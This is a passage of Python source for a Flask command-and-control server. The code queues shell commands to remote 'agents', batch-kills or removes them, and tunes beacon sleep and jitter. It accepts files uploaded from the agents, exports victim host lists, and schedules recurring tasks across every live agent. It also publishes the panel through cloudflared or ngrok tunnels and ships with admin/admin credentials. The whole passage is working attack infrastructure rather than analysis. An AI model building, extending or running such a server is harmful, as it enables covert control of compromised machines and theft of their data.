    log_event("scheduled_created", f"{name} every {interval}s -> {data.get('target','all')}")
    return jsonify({"status": "ok", "id": sid})

@app.route("/api/scheduled/<sid>/delete", methods=["DELETE"])
@login_required
def delete_scheduled(sid):
    db = get_db()
    db.execute("DELETE FROM scheduled_tasks WHERE id=?", (sid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/scheduled/<sid>/toggle", methods=["POST"])
@login_required
def toggle_scheduled(sid):
    db = get_db()
    db.execute("UPDATE scheduled_tasks SET enabled = CASE WHEN enabled=1 THEN 0 ELSE 1 END WHERE id=?", (sid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

# ──────────────────────── API: EXPORT ────────────────────────

@app.route("/api/export/agents")
@login_required
def export_agents():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    cols = ["id","hostname","username","os","arch","ip_external","ip_internal",
            "platform_type","group_name","first_seen","last_seen","is_alive"]
    w.writerow(cols)
    for a in agents:
        w.writerow([a[c] for c in cols])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=agents.csv"})

@app.route("/api/export/logs")
@login_required
def export_logs():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 10000").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["id", "event", "details", "timestamp"])
    for l in logs:
        w.writerow([l["id"], l["event"], l["details"], l["ts"]])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=logs.csv"})

@app.route("/api/export/tasks")
@login_required
def export_tasks():
    db = get_db()
    tasks = db.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 10000").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["id", "agent_id", "task_type", "payload", "status", "result", "created_at", "completed_at"])
    for t in tasks:
        w.writerow([t["id"], t["agent_id"], t["task_type"], t["payload"][:200],
                     t["status"], (t["result"] or "")[:500], t["created_at"], t["completed_at"]])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=tasks.csv"})

# ──────────────────────── API: BATCH OPS ────────────────────────

@app.route("/api/agents/batch", methods=["POST"])
@login_required
def batch_agent_action():
    data = request.get_json(silent=True) or {}
    agent_ids = data.get("agent_ids", [])
    action = data.get("action", "")
    payload = data.get("payload", "")

    if not agent_ids:
        return jsonify({"error": "no agents selected"}), 400

    db = get_db()
    count = 0

    if action == "command":
        task_type, cmd = _expand_shortcut("cmd", payload)
        for aid in agent_ids:
            tid = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                       (tid, aid, task_type, cmd))
            count += 1
        log_event("batch_command", f"{cmd[:60]} -> {count} agents")

    elif action == "group":
        group = data.get("group", "default")
        for aid in agent_ids:
            db.execute("UPDATE agents SET group_name=? WHERE id=?", (group, aid))
            count += 1
        log_event("batch_group", f"group={group} -> {count} agents")

    elif action == "kill":
        for aid in agent_ids:
            tid = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                       (tid, aid, "kill", "self-destruct"))
            count += 1
        log_event("batch_kill", f"{count} agents")

    elif action == "remove":
        for aid in agent_ids:
            db.execute("DELETE FROM tasks WHERE agent_id=?", (aid,))
            db.execute("DELETE FROM agents WHERE id=?", (aid,))
            count += 1
        log_event("batch_remove", f"{count} agents")

    elif action == "sleep":
        sleep_val = int(data.get("sleep", 5))
        jitter_val = int(data.get("jitter", 10))
        for aid in agent_ids:
            db.execute("UPDATE agents SET sleep_interval=?, jitter=? WHERE id=?",
                       (sleep_val, jitter_val, aid))
            count += 1

    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

# ──────────────────────── API: STATS ────────────────────────

@app.route("/api/stats")
@login_required
def api_stats():
    db = get_db()
    total_agents = db.execute("SELECT COUNT(*) c FROM agents").fetchone()["c"]
    alive = db.execute("SELECT COUNT(*) c FROM agents WHERE is_alive=1").fetchone()["c"]
    total_tasks = db.execute("SELECT COUNT(*) c FROM tasks").fetchone()["c"]
    pending = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='pending'").fetchone()["c"]
    completed = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='completed'").fetchone()["c"]
    today = datetime.now().strftime("%Y-%m-%d")
    new_today = db.execute("SELECT COUNT(*) c FROM agents WHERE first_seen LIKE ?", (f"{today}%",)).fetchone()["c"]
    tasks_today = db.execute("SELECT COUNT(*) c FROM tasks WHERE created_at LIKE ?", (f"{today}%",)).fetchone()["c"]
    db.close()
    return jsonify({
        "total_agents": total_agents, "alive": alive,
        "total_tasks": total_tasks, "pending": pending, "completed": completed,
        "new_today": new_today, "tasks_today": tasks_today
    })

# ──────────────────────── API: LISTENERS ────────────────────────

@app.route("/api/listener/create", methods=["POST"])
@login_required
def create_listener():
    data = request.get_json(silent=True) or {}
    lid = str(uuid.uuid4())[:8]
    db = get_db()
    db.execute("INSERT INTO listeners (id, name, protocol, host, port) VALUES (?, ?, ?, ?, ?)",
               (lid, data.get("name", f"listener-{lid}"), data.get("protocol", "http"),
                data.get("host", "0.0.0.0"), data.get("port", 8443)))
    db.commit()
    db.close()
    log_event("listener_created", f"{data.get('protocol','http')}://{data.get('host','0.0.0.0')}:{data.get('port',8443)}")
    return jsonify({"status": "ok", "id": lid})

@app.route("/api/listener/<lid>/delete", methods=["DELETE"])
@login_required
def delete_listener(lid):
    db = get_db()
    db.execute("DELETE FROM listeners WHERE id=?", (lid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

# ──────────────────────── API: USERS ────────────────────────

@app.route("/api/user/create", methods=["POST"])
@login_required
def create_user():
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")
    role = data.get("role", "operator")
    if not username or not password:
        return jsonify({"error": "missing fields"}), 400
    pw = bcrypt.generate_password_hash(password).decode()
    db = get_db()
    try:
        db.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)", (username, pw, role))
        db.commit()
    except sqlite3.IntegrityError:
        return jsonify({"error": "username exists"}), 409
    finally:
        db.close()
    log_event("user_created", f"{username} ({role})")
    return jsonify({"status": "ok"})

@app.route("/api/user/<int:uid>/delete", methods=["DELETE"])
@login_required
def delete_user(uid):
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    if uid == session.get("user_id"):
        return jsonify({"error": "cannot delete yourself while logged in"}), 400
    db = get_db()
    db.execute("DELETE FROM users WHERE id=?", (uid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/user/password", methods=["POST"])
@login_required
def change_password():
    data = request.get_json(silent=True) or {}
    current = data.get("current", "")
    new_pw = data.get("new", "")
    if not current or not new_pw:
        return jsonify({"error": "current and new password required"}), 400
    if len(new_pw) < 4:
        return jsonify({"error": "password must be >= 4 chars"}), 400
    db = get_db()
    user = db.execute("SELECT * FROM users WHERE id=?", (session["user_id"],)).fetchone()
    if not user or not bcrypt.check_password_hash(user["password"], current):
        db.close()
        return jsonify({"error": "current password is wrong"}), 403
    hashed = bcrypt.generate_password_hash(new_pw).decode()
    db.execute("UPDATE users SET password=? WHERE id=?", (hashed, session["user_id"]))
    db.commit()
    db.close()
    log_event("password_changed", session.get("username", "?"))
    return jsonify({"status": "ok"})

# ──────────────────────── API: FILE UPLOAD/DOWNLOAD ────────────────────────

@app.route("/api/upload", methods=["POST"])
def upload_file():
    agent_id = request.form.get("agent_id", "unknown")
    token = get_config("agent_token")
    if token and request.form.get("token") != token and request.headers.get("X-Auth-Token") != token:
        if "user_id" not in session:
            return jsonify({"error": "unauthorized"}), 403
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    safe_name = f.filename.replace("/", "_").replace("\\", "_").replace("..", "_")
    dest = UPLOAD_DIR / f"{agent_id}_{int(time.time())}_{safe_name}"
    f.save(str(dest))
    log_event("file_upload", f"{safe_name} from {agent_id}")
    return jsonify({"status": "ok", "path": str(dest)})

@app.route("/api/download/<path:filename>")
@login_required
def download_file(filename):
    safe = filename.replace("..", "").lstrip("/")
    fpath = UPLOAD_DIR / safe
    if fpath.exists() and str(fpath).startswith(str(UPLOAD_DIR)):
        return send_file(str(fpath))
    return jsonify({"error": "not found"}), 404

# ──────────────────────── WEBSOCKET ────────────────────────

@socketio.on("connect")
def ws_connect():
    emit("status", {"msg": "connected"})

@socketio.on("send_command")
def ws_command(data):
    agent_id = data.get("agent_id", "")
    cmd = data.get("command", "")
    task_type, cmd = _expand_shortcut("cmd", cmd)
    task_id = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
               (task_id, agent_id, task_type, cmd))
    db.commit()
    db.close()
    emit("command_queued", {"task_id": task_id, "agent_id": agent_id, "command": cmd})

# ──────────────────────── AGENT HEALTH CHECKER ────────────────────────

def health_check_loop():
    while True:
        try:
            db = get_db()
            threshold = (datetime.now() - timedelta(seconds=30)).strftime("%Y-%m-%d %H:%M:%S")
            went_offline = db.execute(
                "SELECT id, hostname FROM agents WHERE is_alive=1 AND last_seen < ?", (threshold,)
            ).fetchall()
            if went_offline:
                db.execute("UPDATE agents SET is_alive=0 WHERE last_seen < ?", (threshold,))
                for a in went_offline:
                    socketio.emit("agent_update", {
                        "action": "offline", "id": a["id"], "hostname": a["hostname"]
                    }, namespace="/")
            db.commit()
            db.close()
        except Exception:
            pass
        time.sleep(10)

def scheduled_task_runner():
    """Executes scheduled/recurring tasks at their configured intervals."""
    time.sleep(5)
    while True:
        try:
            db = get_db()
            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            due = db.execute(
                "SELECT * FROM scheduled_tasks WHERE enabled=1 AND (next_run IS NULL OR next_run <= ?)",
                (now_str,)
            ).fetchall()
            for st in due:
                target = st["target"]
                if target == "all":
                    agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
                else:
                    agents = db.execute("SELECT id FROM agents WHERE is_alive=1 AND group_name=?",
                                        (target,)).fetchall()
                task_type, payload = _expand_shortcut(st["task_type"], st["payload"])
                for a in agents:
                    tid = str(uuid.uuid4())
                    db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                               (tid, a["id"], task_type, payload))

                interval = st["interval_sec"]
                next_run = (datetime.now() + timedelta(seconds=interval)).strftime("%Y-%m-%d %H:%M:%S")
                db.execute("UPDATE scheduled_tasks SET last_run=?, next_run=? WHERE id=?",
                           (now_str, next_run, st["id"]))
                log_event("scheduled_fired", f"{st['name']} -> {len(agents)} agents")
            db.commit()
            db.close()
        except Exception:
            pass
        time.sleep(30)

threading.Thread(target=health_check_loop, daemon=True).start()
threading.Thread(target=scheduled_task_runner, daemon=True).start()

# ──────────────────────── TUNNEL ────────────────────────

PUBLIC_URL = {"url": ""}
TUNNEL_LOG = BASE_DIR / "data" / "tunnel.log"
DEFAULT_LOCAL_DOMAIN = "https://c2panel.rog:8443"

def _get_public_url():
    u = get_config("public_url", "").strip()
    if u:
        return u
    u = PUBLIC_URL.get("url", "")
    if u:
        return u
    return DEFAULT_LOCAL_DOMAIN

@app.route("/api/server/public_url")
@login_required
def get_public_url():
    return jsonify({
        "url": _get_public_url(),
        "local": f"{request.scheme}://{request.host}",
    })

def _tunnel_loop(port: int):
    import subprocess, re as _re
    token = get_config("cloudflare_tunnel_token", "").strip()
    if token:
        cmd = ["cloudflared", "tunnel", "run", "--token", token]
        while True:
            try:
                proc = subprocess.run(cmd, cwd=str(BASE_DIR))
            except FileNotFoundError:
                print("[!] cloudflared not found; install for named tunnel")
                break
            except Exception as e:
                print(f"[!] Tunnel error: {e}")
            time.sleep(10)
        return

    for tool_name, cmd, pattern in [
        ("cloudflared",
         ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate", "--protocol", "http2"],
         r'(https://[a-z0-9\-]+\.trycloudflare\.com)'),
        ("ngrok",
         ["ngrok", "http", str(port), "--log", "stdout", "--log-format", "logfmt"],
         r'url=(https://[a-z0-9\-]+\.ngrok[a-z\-]*\.[a-z]+)'),
    ]:
        try:
            while True:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                with open(TUNNEL_LOG, "w") as f:
                    for line in proc.stdout:
                        f.write(line)
                        f.flush()
                        m = _re.search(pattern, line)
                        if m:
                            url = m.group(1)
                            PUBLIC_URL["url"] = url
                            saved = get_config("public_url", "")
                            if not saved or "trycloudflare.com" in saved or "ngrok" in saved:
                                set_config("public_url", url)
                            print(f"[*] PUBLIC TUNNEL ({tool_name}): {url}")
                            log_event("tunnel_up", url)
                            break
                    for line in proc.stdout:
                        f.write(line)
                        f.flush()
                proc.wait()
                time.sleep(5)
        except FileNotFoundError:
            continue
        except Exception as e:
            print(f"[!] {tool_name} tunnel error: {e}")
            time.sleep(10)
            continue

    print("[!] No tunnel tool available (cloudflared/ngrok not found)")

def start_tunnel(port: int):
    threading.Thread(target=_tunnel_loop, args=(port,), daemon=True).start()

# ──────────────────────── MAIN ────────────────────────

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("-p", "--port", type=int, default=8443)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--no-ssl", action="store_true")
    parser.add_argument("--no-tunnel", action="store_true")
    args = parser.parse_args()

    ssl_ctx = None
    if not args.no_ssl:
        cert = BASE_DIR / "data" / "cert.pem"
        key = BASE_DIR / "data" / "key.pem"
        if not cert.exists() or not key.exists():
            import subprocess
            (BASE_DIR / "data").mkdir(parents=True, exist_ok=True)
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", str(key), "-out", str(cert),
                "-days", "365", "-nodes",
                "-subj", "/CN=c2server"
            ], capture_output=True)
        if cert.exists() and key.exists():
            ssl_ctx = (str(cert), str(key))

    saved_url = get_config("public_url", "").strip()
    if saved_url:
        if "c2panel.rog" in saved_url and ":8443" not in saved_url:
            set_config("public_url", "")
            print("[*] Removed old c2panel.rog URL (run setup_domain.sh then use https://c2panel.rog:8443)")
        else:
            PUBLIC_URL["url"] = saved_url
            print(f"[*] Public URL: {saved_url}")
    if not PUBLIC_URL["url"]:
        PUBLIC_URL["url"] = DEFAULT_LOCAL_DOMAIN
        print(f"[*] Local domain: {DEFAULT_LOCAL_DOMAIN}")

    if not args.no_tunnel:
        start_tunnel(args.port)
        time.sleep(2)

    print(f"""
╔══════════════════════════════════════════╗
║           C2 COMMAND & CONTROL           ║
║──────────────────────────────────────────║
║  Host:  {args.host:<33}║
║  Port:  {args.port:<33}║
║  SSL:   {'ON' if ssl_ctx else 'OFF':<33}║
║  Login: admin / admin                    ║
╚══════════════════════════════════════════╝
""")
    log_event("server_start", f"{args.host}:{args.port}")
    kwargs = dict(host=args.host, port=args.port, debug=args.debug, allow_unsafe_werkzeug=True)
    if ssl_ctx:
        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(ssl_ctx[0], ssl_ctx[1])
        kwargs["ssl_context"] = ctx
    socketio.run(app, **kwargs)
